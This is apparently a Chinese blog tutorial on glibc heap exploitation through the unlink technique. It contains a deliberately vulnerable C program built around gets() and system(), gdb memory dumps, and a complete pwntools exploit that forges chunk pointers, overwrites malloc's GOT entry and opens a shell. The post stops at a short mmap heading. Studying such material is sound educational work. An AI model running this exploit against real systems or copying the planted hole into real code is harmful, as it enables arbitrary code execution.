---
layout: post
title: heap教程(二)
excerpt: "heap教程之unlink和mmap"
categories: [未完待续]
comments: true
---

#### Unlink
非fastbinchunk在free的时候,会检查前后是否是freed,然后合并freed.

通过pre_size进入到前一个chunk,然后将这个chunk从它的double-link list中unlink,unlink操作如下
```c
#define unlink(P,BK,FD){
	FD = P ->fd;
	BK = P ->bk;
	if (FD->bk ! = P || BK -> fd != P)							//对前一个chunk进行检查,double link list指过去的那个chunk,是否指回来
		malloc_printerr (check_action,"corrupted d...",P);
	else{
		FD ->bk = BK;
		BK ->fd = FD;
	}
}
```
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	void *p = malloc(130);//非fastbin,大于120
	void *q = malloc(130);
	void *r = malloc(130);
	free(p);
	free(q);
}
```
overwrite heap pointer
```c
p ->fd =&p -0x18
p ->bk =&p -0x10
```
结果`p = &p - 0x18`,就是unlink操作让这个指针指向了它的前24个byte的地方

漏洞代码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char* cmd;			//指针

void sh(char *c){
	system(c);
}

int main(){
	char* ptr[8];		//8个长度为8的指针
	int size,n;
	
	setvbuf(stdout,0,_IONBF,0);
	memset(ptr,0,sizeof(ptr));		//指针置零
	cmd = malloc(128);
	
	while(1){
		fgets(cmd,128,stdin);			//输入写到指针位置
		if (!strncmp(cmd,"add",3)){		//前三个字节是否是add
			printf("Index: ");
			scanf("%d",&n);				//将index值写入n
			if (n>=0 && n<8){
				printf("Size: ");
				scanf("%d%*c",&size);	//将size写入size
				ptr[n] = malloc(size);
				printf("Data: ");
				gets(ptr[n]);
				
			} else{
				puts("out of bound");
			}
		} else if (!strncmp(cmd,"remove",6)){
			printf("Index: ");
			scanf("%d%*c",&n);				//将index写入index
			if (n>=0 && n<8 && ptr[n]){
				puts(ptr[n]);
				free(ptr[n]);				//free掉那个chunk
				ptr[n] = 0;					//指针置零
				
			} else {
				puts("nothing here");
			}
		} else {
			puts("unknow command");
		}
	}
	return 0;
}
```

cmd处位置如下
```
gdb-peda$ x/6gx 0x602010
0x602010:	0x000a65766f6d6572	0x0000000000000000
0x602020:	0x0000000000601090	0x0000000000601098		(fd,bk)
```
查看fd指向的那个chunk,其中的bk是否指了回来
```
gdb-peda$ x/4gx 0x0000000000601090
0x601090 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dd82a0	0x00007ffff7dd84e0
0x6010a0 <completed.6355>:	0x0000000000000000	0x0000000000602010
```
再查看bk指向的那个chunk,其中的fd是否指了回来
```
gdb-peda$ x/4gx 0x0000000000601098
0x601098 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dd84e0	0x0000000000000000
0x6010a8 <cmd>:	0x0000000000602010	0x0000000000000000
```
发现此时可以满足unlink条件,unlink操作之后&p指向了它的前24个byte地址处,然后我们通过fget再次覆盖&p,使它指向malloc,其中malloc地址如下
```
gdb-peda$ x/4i 0x400780
   0x400780 <malloc@plt>:	jmp    QWORD PTR [rip+0x2008e2]        # 	
   0x400786 <malloc@plt+6>:	push   0xa
   0x40078b <malloc@plt+11>:	jmp    0x4006d0
```
fget地址
```
0x400750 <fgets@plt>:	jmp    QWORD PTR [rip+0x2008fa]        # 0x601050
   0x400756 <fgets@plt+6>:	push   0x7
   0x40075b <fgets@plt+11>:	jmp    0x4006d0
```
最终exp
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']   #程序在在tmux中运行,

def add(index,size,data):
    p.sendline('add')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')
    p.sendline(data)

def remove(index):
    p.sendline('remove')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvline()

cmd = 0x600f48                  #指针位置,指向了buf
p = process('./unlinkmorty')
raw_input('#')
add(0,128,"A"*100)
add(1,128,"B"*100)
remove(0)
p.sendline("add\0AAAA"+p64(0)+p64(cmd-0x18)+p64(cmd-0x10))
p.recvuntil('Index: ')
p.sendline(str(2))
p.recvuntil('Size: ')
p.sendline(str(128))
p.recvuntil('Data: ')
p.sendline("C"*128+p64(272)+p64(0x90)+p64(0xafafafaf))     #padding+ pre_size + size + fd
remove(1)
p.sendline(p64(0x00007ffff7dd82a0)+p64(0x00007ffff7dd84e0)+p64(0)+p64(0x600f08))   #stdout,stdin,completed,&cmd     (0x600f08是malloc的前一个地址)
p.recvline()
p.sendline('add\0sh\0A'+p64(0x40086d))      #注意这里写了sh, 之后就是覆盖了malloc为sh
p.recvuntil('Index: ')
p.sendline(str(1))
p.recvuntil('Size: ')
p.sendline(str(int(0x600f0c)))          #这个就是sh的地址
p.interactive()
```


#### mmap和arena
size超过0x21000,会改用mmap